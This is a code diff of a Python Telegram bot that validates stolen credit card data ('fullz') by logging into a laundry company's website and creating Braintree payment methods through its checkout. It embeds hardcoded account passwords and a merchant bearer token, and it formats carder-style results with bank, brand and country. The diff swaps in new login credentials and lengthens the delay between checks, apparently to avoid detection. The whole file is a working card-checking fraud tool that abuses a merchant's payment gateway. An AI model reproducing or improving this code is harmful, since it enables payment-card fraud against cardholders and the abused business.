@@ -17,8 +17,6 @@ from telegram.ext import (
     ContextTypes,
 )
 
-import pycountry  # TAMBAHAN IMPORT UNTUK KONVERSI NEGARA
-
 # ================= CONFIG ===================
 OWNER_ADMIN_ID = 7519839885  # REPLACE WITH YOUR TELEGRAM USER ID (OWNER ADMIN)
 ADMIN_ID_FILE = "admin_ids.txt"
@@ -38,6 +36,7 @@ def save_admin_chat_ids(admins: set[int]) -> None:
 
 admin_chat_ids = get_admin_chat_ids()
 
+# HELPER FUNCTION TO EXTRACT SUBSTRING BETWEEN START AND END
 def gets(s: str, start: str, end: str) -> str | None:
     try:
         start_index = s.index(start) + len(start)
@@ -46,36 +45,7 @@ def gets(s: str, start: str, end: str) -> str | None:
     except ValueError:
         return None
 
-# TAMBAHAN: Fungsi untuk konversi kode negara jadi nama lengkap
-def country_code_to_name(code: str) -> str:
-    try:
-        country = pycountry.countries.get(alpha_3=code.upper())
-        if country:
-            return country.name
-        country = pycountry.countries.get(alpha_2=code.upper())
-        if country:
-            return country.name
-    except Exception:
-        pass
-    return code
-
-# TAMBAHAN: Fungsi untuk mengubah nama negara jadi flag emoji
-def country_name_to_flag_emoji(country_name: str) -> str:
-    try:
-        country = pycountry.countries.get(name=country_name)
-        if not country:
-            for c in pycountry.countries:
-                if country_name.lower() in map(str.lower, [c.name, getattr(c, 'official_name', ''), getattr(c, 'common_name', '')]):
-                    country = c
-                    break
-        if country:
-            code = country.alpha_2.upper()
-            OFFSET = 127397
-            return ''.join(chr(ord(char) + OFFSET) for char in code)
-    except Exception:
-        pass
-    return ""
-
+# CREATE PAYMENT METHOD WITH EXPIRY VALIDATION (revised to continue even if expiry invalid)
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str]:
     try:
         cc, mes, ano, cvv = fullz.split("|")
@@ -145,8 +115,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
         data = {
             'ihcaction': 'login',
             'ihc_login_nonce': login,
-            'log': 'rensena',
-            'pwd': 'Rensena123',
+            'log': 'Lena Molina',
+            'pwd': 'LenaMon12',
         }
 
         response = await session.post('https://boltlaundry.com/loginnow/', headers=headers, data=data)
@@ -211,7 +181,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
         headers = {
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
-            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTYyNzk0NDIsImp0aSI6ImE4NmE4NTNkLWE2NDktNDc4MS1hYWQ3LTJmZWRiODNmYjY4MyIsInN1YiI6IjYzY21iM253Ym5wcjNmOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjYzY21iM253Ym5wcjNmOXkiLCJ2ZXJ5X2NhcmRfYnlfZGVmYXVsdCI6dHJ1ZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwiY29wZS I6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYm9sdGxhdW5kcnlzZXJ2aWNlX2luc3RhbnQiLCJwYXlwYWxfYWNjb3VudF9udW1iZXIiOiIyMDgwNTMyNzQwMjE1MzYwMzc1IiwicGF5cGFsX2NsaWVudF9pZCI6IkFSZmI4eS1UQThIRVViSE1obzh0b1FnZndFNUUxUUtJQlpkNnhzUmFEVkl5SUJwMC1RNkgyeHI4VllhOEZVNTdHVUJQT1pSX19kcm5RY0llIn19.eMD0-Hp8DzDXLts3bd3gQ-_7jCAfXzT4sAlNQk-7SgAJaAfLQON0qi8n1CbaZsuwNEJfN0TsBX16X6e2IaDsFA',
+            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTYyNzk0NDIsImp0aSI6ImE4NmE4NTNkLWE2NDktNDc4MS1hYWQ3LTJmZWRiODNmYjY4MyIsInN1YiI6IjYzY21iM253Ym5wcjNmOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjYzY21iM253Ym5wcjNmOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYm9sdGxhdW5kcnlzZXJ2aWNlX2luc3RhbnQiLCJwYXlwYWxfYWNjb3VudF9udW1iZXIiOiIyMDgwNTMyNzQwMjE1MzYwMzc1IiwicGF5cGFsX2NsaWVudF9pZCI6IkFSZmI4eS1UQThIRVViSE1obzh0b1FnZndFNUUxUUtJQlpkNnhzUmFEVkl5SUJwMC1RNkgyeHI4VllhOEZVNTdHVUJQT1pSX19kcm5RY0llIn19.eMD0-Hp8DzDXLts3bd3gQ-_7jCAfXzT4sAlNQk-7SgAJaAfLQON0qi8n1CbaZsuwNEJfN0TsBX16X6e2IaDsFA',
             'braintree-version': '2018-05-10',
             'content-type': 'application/json',
             'origin': 'https://assets.braintreegateway.com',
@@ -311,9 +281,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
     except Exception as e:
         return f"EXCEPTION: {str(e)}", '', '', '', ''
 
-
+# FUNCTION MAPS API RESPONSE TEXT TO FRIENDLY MESSAGE
 async def charge_resp(result):
-    # (Your existing charge_resp function unchanged)
     try:
         if (
             '{"status":"SUCCESS",' in result
@@ -426,7 +395,6 @@ async def charge_resp(result):
     except Exception as e:
         return f"{str(e)} ❌"
 
-
 async def multi_checking(fullz: str) -> str:
     start = time.time()
     async with httpx.AsyncClient(timeout=40) as session:
@@ -465,15 +433,12 @@ async def multi_checking(fullz: str) -> str:
     else:
         response = error_message or "Expiration date invalid ❌"
 
-    full_country_name = country_code_to_name(country)
-    flag = country_name_to_flag_emoji(full_country_name)
-
     if error_message:
         output = (
             f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
             f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
             f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
-            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {full_country_name} {flag}\n"
+            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
             f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
             f"𝗕𝗮𝗻𝗸: » {bank}\n"
             f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱: » {prepaid}\n"
@@ -484,7 +449,7 @@ async def multi_checking(fullz: str) -> str:
             f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
             f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
             f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
-            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {full_country_name} {flag}\n"
+            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
             f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
             f"𝗕𝗮𝗻𝗸: » {bank}\n"
             f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱: » {prepaid}\n"
@@ -495,7 +460,6 @@ async def multi_checking(fullz: str) -> str:
                 file.write(output + "\n")
 
     return output
-
 
 TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")
 
@@ -615,7 +579,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
             cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
 
-            await asyncio.sleep(3)
+            await asyncio.sleep(20)
 
             result = await multi_checking(cc_formatted)
             await update.message.reply_text(result, parse_mode='HTML')
